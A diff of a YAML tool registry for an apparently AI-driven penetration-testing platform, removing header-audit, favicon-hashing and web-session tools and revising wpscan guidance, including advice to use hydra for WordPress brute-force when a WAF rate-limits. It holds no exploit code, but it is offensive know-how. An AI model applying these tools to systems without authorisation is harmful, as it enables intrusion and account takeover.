-          behavior, and spot unusual or custom headers that may reveal application internals. For specifically checking security
-          header compliance, use the security_headers method instead.
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL (e.g., 'http://10.10.10.1'). Scheme auto-added as http:// if omitted.
-          timeout:
-            type: integer
-            default: 30
-            description: HTTP request timeout in seconds
-        returns:
-          security_headers:
-            type: object
-            description: Security-related headers found (CSP, HSTS, X-Frame-Options, etc.)
-          server_headers:
-            type: object
-            description: Server information headers (Server, X-Powered-By, X-AspNet-Version, X-Generator)
-          cache_headers:
-            type: object
-            description: Cache control headers (Cache-Control, Expires, Pragma, ETag, Last-Modified)
-          other_headers:
-            type: object
-            description: All remaining headers not in the above categories
-          status_code:
-            type: integer
-            description: HTTP response status code
-      security_headers:
-        description: 'Audit 7 security headers against best practices and flag misconfigurations. Checks: Strict-Transport-Security
-          (HSTS — forces HTTPS, flags max-age < 1 year), Content-Security-Policy (CSP — prevents XSS/injection), X-Content-Type-Options
-          (prevents MIME sniffing), X-Frame-Options (prevents clickjacking, flags values other than DENY/SAMEORIGIN), X-XSS-Protection
-          (legacy XSS filter), Referrer-Policy (controls referrer leakage), Permissions-Policy (controls browser features).
-          Also detects information disclosure via Server, X-Powered-By, X-AspNet-Version, and X-Generator headers that reveal
-          technology and version info.'
-        when_to_use: 'After identifying HTTP/HTTPS services to audit security header configuration. Missing or misconfigured
-          security headers are common findings in penetration test reports. Run this to check for: missing HSTS (allows SSL
-          stripping), missing CSP (enables XSS), missing X-Frame-Options (enables clickjacking), weak HSTS max-age, and server
-          version disclosure. Results include a score (e.g., ''4/7'') and severity ratings per finding.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL (e.g., 'https://target.htb'). Scheme auto-added as http:// if omitted.
-          timeout:
-            type: integer
-            default: 30
-            description: HTTP request timeout in seconds
-        returns:
-          missing_headers:
-            type: array
-            description: Security headers not present, each with header name, description of what it protects against, and
-              severity (medium/low/info)
-          present_headers:
-            type: array
-            description: Security headers found, each with header name, actual value, and description
-          issues:
-            type: array
-            description: 'Misconfigurations found: weak X-Frame-Options values, short HSTS max-age (<1 year), information
-              disclosure from Server/X-Powered-By/X-AspNet-Version/X-Generator headers'
-          score:
-            type: string
-            description: Security header compliance score as 'present/total' (e.g., '4/7')
-      favicon_hash:
-        description: Download /favicon.ico from the target and calculate its MurmurHash3 (mmh3) hash for Shodan favicon search,
-          plus MD5 for general identification. The mmh3 hash is Shodan-compatible — the generated Shodan query will produce
-          accurate results. Also returns MD5 for cross-target favicon comparison.
-        when_to_use: 'During reconnaissance to identify the web application or framework by its favicon. Many default application
-          installations (e.g., Spring Boot, Apache Tomcat, Grafana, Jenkins) have recognizable default favicons. The hash
-          can be used to: identify the application if no other indicators are present, find similar servers via Shodan using
-          the mmh3 hash (http.favicon.hash:<hash>), and compare favicons across different ports/vhosts on the same target
-          using the MD5 hash.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL — the method will automatically request /favicon.ico from the target's root (e.g., 'http://10.10.10.1'
-              → fetches 'http://10.10.10.1/favicon.ico')
-          timeout:
-            type: integer
-            default: 30
-            description: HTTP request timeout in seconds
-        returns:
-          favicon_url:
-            type: string
-            description: Full URL that was fetched (e.g., 'http://10.10.10.1/favicon.ico')
-          size_bytes:
-            type: integer
-            description: Favicon file size in bytes
-          md5:
-            type: string
-            description: MD5 hash of the favicon file content (for general identification)
-          mmh3:
-            type: integer
-            description: MurmurHash3 hash of the base64-encoded favicon (Shodan-compatible)
-          shodan_query:
-            type: string
-            description: Ready-to-use Shodan search query string (e.g., 'http.favicon.hash:-12345678')
-  web-session:
-    name: web-session
-    version: '1.0'
-    description: 'Web session state management for authenticated security testing. 7 methods: login (POST form login and capture
-      session cookies), get_cookies (retrieve stored cookies in header/dict/raw format for use with other tools), set_cookies
-      (import cookies from browser or other source), request (make authenticated HTTP requests with stored session), list_sessions
-      (show all stored sessions), extract_csrf (extract CSRF tokens from pages via regex), delete_session (cleanup). Named
-      sessions persist across calls within a container session. Cookies can be exported as header strings for curl, ffuf,
-      sqlmap, etc.'
-    image: ghcr.io/silicon-works/mcp-tools-web-session:latest
-    image_size_mb: 100
-    timeout_seconds: 300
-    capabilities:
-    - session_management
-    - cookie_handling
-    - authenticated_requests
-    - csrf_extraction
-    phases:
-    - enumeration
-    - exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    routing:
-      use_for:
-      - login to web application and capture session cookies for reuse across tools
-      - store and manage authenticated session cookies for multi-step web testing
-      - extract CSRF tokens from web pages for form submission attacks
-      - make authenticated HTTP requests using stored session cookies
-      - export session cookies as header string for curl ffuf sqlmap and other tools
-      - import cookies from browser or Playwright session for use in CLI tools
-      never_use_for:
-      - unauthenticated scanning
-      - port scanning
-      - brute-force login
-      triggers:
-      - session
-      - cookie
-      - CSRF
-      - authenticated request
-      - login session
-      - web session
-      prefer_over:
-      - curl
-    methods:
-      login:
-        description: Perform login and capture session cookies
-        when_to_use: To authenticate to a web application and store session for reuse
-        params:
-          url:
-            type: string
-            required: true
-            description: Login URL endpoint
-          username_field:
-            type: string
-            default: username
-            description: Form field name for username
-          password_field:
-            type: string
-            default: password
-            description: Form field name for password
-          username:
-            type: string
-            required: true
-            description: Username to login with
-          password:
-            type: string
-            required: true
-            description: Password to login with
-          extra_fields:
-            type: object
-            description: Additional form fields (e.g., CSRF token)
-          session_name:
-            type: string
-            default: default
-            description: Name to store this session under
-          success_indicator:
-            type: string
-            description: Text that indicates successful login
-          failure_indicator:
-            type: string
-            description: Text that indicates failed login
-          headers:
-            type: object
-            description: Custom HTTP headers
-          timeout:
-            type: integer
-            default: 30
-            description: Request timeout in seconds
-        returns:
-          login_success:
-            type: boolean
-            description: Whether login succeeded
-          cookies:
-            type: object
-            description: Captured session cookies
-          cookie_header:
-            type: string
-            description: Cookie string for use in other tools
-      get_cookies:
-        description: Get cookies from a stored session
-        when_to_use: To retrieve cookies for use with other tools (curl, ffuf, etc.)
-        params:
-          session_name:
-            type: string
-            default: default
-            description: Session name to retrieve
-          format:
-            type: enum
-            values:
-            - header
-            - dict
-            - raw
-            default: header
-            description: Output format
-        returns:
-          cookies:
-            type: object
-            description: Session cookies
-          cookie_header:
-            type: string
-            description: Cookie header string
-      set_cookies:
-        description: Manually set cookies for a session
-        when_to_use: To import cookies from browser or other source
-        params:
-          cookies:
-            type: string
-            required: true
-            description: 'Cookie string (format: ''name1=value1; name2=value2'')'
-          session_name:
-            type: string
-            default: default
-            description: Session name to store under
-          domain:
-            type: string
-            description: Cookie domain
-        returns:
-          cookies:
-            type: object
-            description: Parsed cookies
-      request:
-        description: Make authenticated request using stored session
-        when_to_use: To make requests with session cookies automatically included
-        params:
-          url:
-            type: string
-            required: true
-            description: URL to request
-          method:
-            type: enum
-            values:
-            - GET
-            - POST
-            - PUT
-            - DELETE
-            default: GET
-            description: HTTP method
-          session_name:
-            type: string
-            default: default
-            description: Session to use
-          data:
-            type: string
-            description: Request body data
-          headers:
-            type: object
-            description: Additional HTTP headers
-          timeout:
-            type: integer
-            default: 30
-            description: Request timeout
-        returns:
-          status_code:
-            type: integer
-            description: HTTP response status
-          body:
-            type: string
-            description: Response body
-      list_sessions:
-        description: List all stored sessions
-        when_to_use: To see available authenticated sessions
-        params: {}
-        returns:
-          sessions:
-            type: array
-            description: List of stored sessions
-      extract_csrf:
-        description: Extract CSRF token from a page
-        when_to_use: To get CSRF token for form submissions
-        params:
-          url:
-            type: string
-            required: true
-            description: URL to fetch
-          session_name:
-            type: string
-            default: default
-            description: Session to use (if any)
-          token_pattern:
-            type: string
-            description: Regex pattern to extract token
-          timeout:
-            type: integer
-            default: 30
-            description: Request timeout
-        returns:
-          token:
-            type: string
-            description: Extracted CSRF token
-          tokens:
-            type: array
-            description: All tokens found
-      delete_session:
-        description: Delete a stored session
-        when_to_use: To clean up sessions or logout
-        params:
-          session_name:
-            type: string
-            required: true
-            description: Session name to delete
-        returns:
-          session_name:
-            type: string
-            description: Name of deleted session
-          deleted:
-            type: boolean
-            description: Whether session was deleted
   wpscan:
     name: wpscan
     kind: cli
@@ -25197,12 +23197,10 @@ tools:
     - tool: hydra
       reason: For WordPress brute-force, hydra has the http-form-post module which is more flexible than wpscan's built-in
         attack — use when wpscan's built-in attack is rate-limited by a WAF or security plugin (Wordfence, Sucuri).
-    - tool: cve-lookup
-      reason: For each CVE that wpscan reports against a detected plugin, use cve-lookup to fetch full NVD details, CVSS scores,
-        and links to public exploits / Metasploit modules.
-    - tool: web-fingerprint
-      reason: 'Run web-fingerprint FIRST to confirm the site is WordPress (look for `/wp-content/`, `wp-login.php`, `X-Powered-By:
-        WordPress` header) before invoking wpscan. wpscan''s --force can override but burns time on non-WordPress targets.'
+    - tool: curl
+      reason: 'Cheap WordPress confirmation before invoking wpscan: `curl -skSL URL | grep -Eio ''wp-content|wp-includes|wp-login.php''`
+        or check the `X-Powered-By` / `Link: <...wp-json...>` headers. wpscan''s --force can override but burns time on non-WordPress
+        targets.'
     target_extraction:
     - rule: flag_value
       flag: --url
